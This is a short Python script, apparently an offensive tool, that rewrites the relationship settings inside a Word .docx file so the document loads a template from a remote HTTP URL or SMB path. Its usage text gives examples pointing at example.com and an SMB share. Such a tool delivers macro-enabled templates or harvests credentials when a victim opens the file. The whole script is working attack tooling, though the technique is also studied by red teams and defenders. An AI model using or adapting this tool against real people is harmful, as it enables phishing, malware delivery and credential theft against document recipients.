import os
import zipfile
import re
from xml.dom.minidom import parseString
import sys
import argparse
from argparse import RawTextHelpFormatter

parser = argparse.ArgumentParser(description='Inject Template Through Relationship Settings', formatter_class=RawTextHelpFormatter,
	epilog='Example of use\n'
		   'To inject remote http url:\n\n'
		   '\tremoteinjector.py -w https://example.com/template.dotm example.docx\n\n'
		   'To inject SMB path:\n\n'
		   '\tremoteinjector.py -w \\\\1.1.1.1\C$\TEMP\\template.dotm example.docx')
parser.add_argument('file', metavar='F', type=str, help='.docx file to inject template into')
parser.add_argument('-w', dest='url', type=str, help='remote url to template')

args = parser.parse_args()

index = args.file.find('.docx')
f_in = args.file
base = f_in[0:index]
f_out = base+'_new.docx'
doc_in = zipfile.ZipFile(args.file)
doc_out = zipfile.ZipFile(f_out, 'w')

exists = False
for f in doc_in.namelist():
	if f == 'word/_rels/settings.xml.rels':
		exists = True
if (not exists):
	print("Error: Use a docx with a preloaded template")
	exit()

xml = parseString(doc_in.read('word/_rels/settings.xml.rels'))
xml.getElementsByTagName('Relationship')[0].setAttribute('Target', args.url)

for i in doc_in.infolist():
	buf = doc_in.read(i.filename)
	if (i.filename == 'word/_rels/settings.xml.rels'):
		doc_out.writestr(i, xml.toprettyxml(indent=''))
	else:
		doc_out.writestr(i, buf)
doc_out.close()
doc_in.close()

print("\nURL Injected and saved to " + f_out)